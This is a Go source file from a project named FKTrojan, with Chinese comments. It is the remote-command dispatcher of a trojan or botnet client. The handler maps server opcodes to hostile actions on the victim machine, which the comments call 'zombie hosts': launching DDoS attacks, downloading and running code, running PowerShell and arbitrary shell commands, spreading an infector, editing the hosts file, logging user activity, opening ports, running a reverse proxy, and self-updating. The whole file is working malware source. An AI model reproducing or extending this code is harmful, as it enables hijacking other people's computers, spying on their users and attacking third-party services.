/*
Author: FreeKnight
从服务器过来的命令的分发和处理
*/
//------------------------------------------------------------
package components

//------------------------------------------------------------
import (
	"errors"
	"os"
	"strconv"
	"strings"

	"fmt"

	"FKTrojan/common"

	"golang.org/x/sys/windows/registry"
)

func CheckCommand(cmd *common.Command) error {
	val, _ := getRegistryKeyValue(registry.CURRENT_USER, "Software\\"+myInstallReg+"\\", "LAST")
	if cmd.Hash() == lastCommand {
		return fmt.Errorf("same as last memory command ignore it")
	}
	if cmd.Hash() == val {
		return fmt.Errorf("same as last register command ignore it")
	}
	if cmd.UID != myUID && cmd.UID != "000" {
		return fmt.Errorf("command uid %s != my uid %s,  not for me", cmd.UID, myUID)
	}
	registryLastCommand(cmd.Hash())
	return nil
}

//------------------------------------------------------------
// 命令分发处理函数
func ExecuteCommand(cmd *common.Command) (stdout string, err error) {
	tmp := make([]string, 0)
	tmp = append(tmp, cmd.UID)
	tmp = append(tmp, cmd.Code)
	tmp = append(tmp, cmd.Parameters...)
	return MsgHandler(cmd.Code, tmp)
}

//------------------------------------------------------------
func MsgHandler(MsgType string, tmp []string) (string, error) {
	isLastCommandFinished = false // 标示当前在忙

	if MsgType == "0x0" { // 0 退出
		os.Exit(0)
		isLastCommandFinished = true
		return "OS exited.", nil
	} else if MsgType == "0x1" {
		if len(tmp) != 4 {
			isLastCommandFinished = true
			return "", errors.New("0x1 command must have 2 params")
		}
		isLastCommandFinished = true
		return openURL(tmp[2], tmp[3]) // 1 打开指定网站
	} else if MsgType == "0x2" {
		if len(tmp) != 4 {
			isLastCommandFinished = true
			return "", errors.New("0x2 command must have 2 params")
		}
		isLastCommandFinished = true
		return startEXE(tmp[2], tmp[3]) // 2 执行指定EXE文件
	} else if MsgType == "0x3" {
		if len(tmp) != 6 {
			isLastCommandFinished = true
			return "", errors.New("0x3 command must have 4 params")
		}
		isLastCommandFinished = true
		threadsCount, _ := strconv.Atoi(tmp[4])
		intervalTime, _ := strconv.Atoi(tmp[5])
		return startDDosAttack(tmp[2], tmp[3],
			threadsCount, intervalTime) // 3 开启DDos攻击
	} else if MsgType == "0x4" {
		setDDoSMode(false) // 4 关闭DDos攻击
		return "Stop DDos successed.", nil
	} else if MsgType == "0x5" {
		if len(tmp) != 7 {
			isLastCommandFinished = true
			return "", errors.New("0x5 command must have 5 params")
		}
		return downloadAndRun(tmp[2], tmp[3], // 5 下载并运行指定进程
			tmp[4], tmp[5], tmp[6])
	} else if MsgType == "0x6" {
		if len(tmp) != 4 {
			isLastCommandFinished = true
			return "", errors.New("0x6 command must have 2 params")
		}
		return runPowershell(tmp[2], tmp[3]) // 6 执行MicrosoftPowerShell
	} else if MsgType == "0x7" {
		if len(tmp) != 3 {
			isLastCommandFinished = true
			return "", errors.New("0x7 command must have 1 params")
		}
		return (infection(tmp[2])) // 7 传播感染器
	} else if MsgType == "0x8" {
		return startWebServer() // 8 在肉鸡上开启一个本地web服务器
	} else if MsgType == "0x9" {
		if len(tmp) != 4 {
			isLastCommandFinished = true
			return "", errors.New("0x9 command must have 2 params")
		}
		return editPage(tmp[2], tmp[3]) // 9 修改肉鸡的web服务器的页面
	} else if MsgType == "1x0" {
		if len(tmp) != 4 {
			isLastCommandFinished = true
			return "", errors.New("1x0 command must have 2 params")
		}
		return hideProcWindow(tmp[2], tmp[3]) // 10 隐藏一个进程窗口
	} else if MsgType == "1x1" {
		if len(tmp) != 3 {
			isLastCommandFinished = true
			return "", errors.New("1x1 command must have 1 params")
		}
		return downloadByTorrentSeed(tmp[2]) // 11 使用BT种子进行下载
	} else if MsgType == "1x2" {
		if len(tmp) != 3 {
			isLastCommandFinished = true
			return "", errors.New("1x2 command must have 1 params")
		}
		return shutdown(tmp[2]) // 12 重启/关闭计算机
	} else if MsgType == "1x3" {
		if len(tmp) != 3 {
			isLastCommandFinished = true
			return "", errors.New("1x3 command must have 1 params")
		}
		return setHomepage(tmp[2]) // 13 设置其默认主页
	} else if MsgType == "1x4" {
		if len(tmp) != 4 {
			isLastCommandFinished = true
			return "", errors.New("1x4 command must have 2 params")
		}
		return setBackground(tmp[2], tmp[3]) // 14 设置其桌面背景图片
	} else if MsgType == "1x5" {
		if len(tmp) != 4 {
			isLastCommandFinished = true
			return "", errors.New("1x5 command must have 2 params")
		}
		return editHost(tmp[2], (tmp[3] != "0")) // 15 修改/恢复 其host文件
	} else if MsgType == "1x6" {
		if len(tmp) != 3 {
			isLastCommandFinished = true
			return "", errors.New("1x6 command must have 1 params")
		}
		if tmp[2] != "yes" {
			return "", errors.New("1x6 command's param is wrong")
		}
		s, err := uninstall() // 16 自我清除
		if err != nil {
			return s, err
		}
		defer os.Exit(0)
	} else if MsgType == "1x7" { // 17 打开UPnp指定端口，以便进行指定端口的网页访问
		if len(tmp) != 3 {
			isLastCommandFinished = true
			return "", errors.New("1x7 command must have 1 params")
		}
		i3, err := strconv.Atoi(tmp[2])
		if err != nil {
			return "", err
		}
		return openPort(i3)
	} else if MsgType == "1x8" {
		if len(tmp) != 4 {
			isLastCommandFinished = true
			return "", errors.New("1x8 command must have 2 params")
		}
		return handleScripters(tmp[2], tmp[3]) // 18 执行指定脚本
	} else if MsgType == "1x9" {
		if len(tmp) != 3 {
			isLastCommandFinished = true
			return "", errors.New("1x9 command must have 1 params")
		}
		return runThirdExe(tmp[2]) // 19 执行指定进程
	} else if MsgType == "2x0" { // 20 开启反向代理服务器
		if len(tmp) != 4 {
			isLastCommandFinished = true
			return "", errors.New("2x0 command must have 2 params")
		}
		return startReverseProxy(tmp[2], tmp[3])
	} else if MsgType == "2x1" { // 21 向肉鸡推送个文件并保存起来
		if len(tmp) != 6 {
			isLastCommandFinished = true
			return "", errors.New("2x1 command must have 4 params")
		}

		return filePush(tmp[2], tmp[3], tmp[4], tmp[5])
	} else if MsgType == "2x2" {
		if len(tmp) != 3 {
			isLastCommandFinished = true
			return "", errors.New("2x2 command must have 1 params")
		}
		return killThirdExe(tmp[2]) // 22 终止指定进程
	} else if MsgType == "2x3" {
		if len(tmp) != 5 {
			isLastCommandFinished = true
			return "", errors.New("2x3 command must have 3 params")
		}
		return update(tmp[2], tmp[3], tmp[4]) // 23 木马的自我更新
	} else if MsgType == "2x4" { // 24 切换用户行为记录模式
		if !isUserActionLogging {
			setUserActionLoggerMode(true)
			return "Start to log user's actions", nil
		} else {
			setUserActionLoggerMode(false)
			return "Stop to log user's actions", nil
		}
		if isUserActionLogging {
			startUserActionLogger()
		}
	} else if MsgType == "2x5" { // 25 安全文件修改
		if len(tmp) != 5 {
			isLastCommandFinished = true
			return "", errors.New("2x5 command must have 3 params")
		}
		return safeModifyFile(tmp[2], tmp[3], tmp[4])
	} else if MsgType == "2x6" {
		cmdString := strings.Join(tmp[2:], " ")
		stdout, stderr, err := common.RunExe(cmdString)
		FKDebugLog("run cmd %s, stdout: %s, stderr: %s", cmdString, stdout, stderr)
		if err != nil || stderr != "" {
			return stdout, fmt.Errorf("stderr:[%s], err:[%v]", stderr, err)
		}
		return stdout, nil
	}
	// else if MsgType == "refresh" {}
	// 刷新一下command而已

	FKDebugLog("Unknown Command Received...")
	isLastCommandFinished = true // 声明上一任务已经完成
	return "", errors.New("Unknown command.")
}
